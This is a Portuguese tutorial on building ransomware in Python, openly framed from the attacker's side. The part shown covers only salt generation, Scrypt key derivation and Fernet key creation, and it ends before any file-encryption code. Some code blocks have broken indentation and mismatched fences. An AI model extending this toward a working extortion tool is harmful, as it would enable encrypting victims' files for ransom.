# Entendendo um Ransomware na Prática com Python

## O que é um Ransomware?
Ransomware é um tipo de malware que criptografa os arquivos de um sistema e os descriptografa somente após uma quantia em dinheiro ser paga ao invasor.

Existem muitos tipos de ransomware. O que construiremos neste tutorial usa a mesma senha para criptografar e descriptografar os dados. Em outras palavras, usamos funções de derivação de chave para derivar uma chave de uma senha. Então, hipoteticamente, quando a vítima nos paga, simplesmente daremos a ela a senha para descriptografar seus arquivos.

Assim, em vez de gerar uma chave aleatoriamente, usamos uma senha para derivar a chave, e existem algoritmos para esse propósito. Um desses algoritmos é o Scrypt, uma função de derivação de chave baseada em senha criada em 2009 por Colin Percival.

### Passo-a-Passo
- Primeiro instalamos a biblioteca de criptografia construída sobre o algoritmo de criptografia AES:

```python
$ pip install cryptography
```

- Abra um novo arquivo, chame-o de ransomware.py e importe o seguinte:

```python
import pathlib
import secrets
import os
import base64
import getpass
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
```

- Primeiro, as funções de derivação de chave precisam de bits aleatórios adicionados à senha antes que ela seja hash; esses bits são frequentemente chamados de salts, que ajudam a fortalecer a segurança e proteger contra ataques de dicionário e força bruta. Vamos fazer uma função para gerar isso usando o módulo secrets:

```python
def generate_salt(size=16):
"""Gere o salt usado para derivação de chave,
`size` é o comprimento do salt a ser gerado"""
return secrets.token_bytes(size)
```

Estamos usando o módulo secrets em vez de random porque secrets é usado para gerar números aleatórios criptograficamente fortes adequados para geração de senha, tokens de segurança, salts, etc. 

- Em seguida, vamos criar uma função para derivar a chave da senha e do salt:

```
def derive_key(salt, password):
    """Derive a chave da `senha` usando o `salt` passado"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
```
Inicializamos o algoritmo Scrypt passando o seguinte:

- O salt.
- O comprimento desejado da chave (32 neste caso).
- n: Parâmetro de custo de CPU/memória que deve ser maior que 1 e ser uma potência de 2.
- r: Parâmetro de tamanho de bloco.
- p: Parâmetro de paralelismo.

Conforme mencionado na documentação, n, r e p podem ajustar o custo computacional e de memória do algoritmo Scrypt. O RFC 7914 recomenda r=8, p=1, onde o artigo original do Scrypt sugere que n deve ter um valor mínimo de `2**14` para logins interativos ou `2**20` para arquivos mais sensíveis, você pode verificar a documentação para mais informações.

- Em seguida, criamos uma função para carregar um salt gerado anteriormente:

````python
def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()
```

- Agora que temos as funções de geração de salt e derivação de chave, vamos criar a função principal que gera a chave a partir de uma senha:

``` python
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Gera uma chave a partir de uma `password` e do salt.
        Se `load_existing_salt` for True, ele carregará o salt de um arquivo
        no diretório atual chamado "salt.salt".
        Se `save_salt` for True, ele gerará um novo salt
        e o salvará em "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)
```
## Bibliografia
1. ABDELADIM FADHELI. How to Make a Ransomware in Python - The Python Code. Disponível em: <https://thepythoncode.com/article/make-a-ransomware-in-python>. Acesso em: 18 dez. 2024.
2. Password-Based Key Derivation Function.WIKIPEDIA. Disponível em: <https://en.wikipedia.org/wiki/Scrypt>. Acesso em: 18 dez. 2024.
3. Block Cipher Standard. WIKIPEDIA. Disponível em: <https://en.wikipedia.org/wiki/Advanced_Encryption_Standard>. Acesso em: 18 dez. 2024.
4. Rayhan, Abu & Kinzler, Robert & Rayhan, Rajan. (2023). Cybersecurity Best Practices for Python Web Applications. 10.13140/RG.2.2.29658.11202. 
